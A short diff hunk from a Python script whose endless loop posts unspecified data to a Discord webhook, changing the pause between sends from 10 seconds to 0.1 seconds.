@@ -27,5 +27,5 @@ while 1 > 0:
             print(f"Data sent to Discord webhook successfully: {webhook_response.status_code}")
         except requests.RequestException as e:
             print(f"Error sending data to Discord webhook: {e}")
-    time.sleep(10)
+    time.sleep(0.1)
 
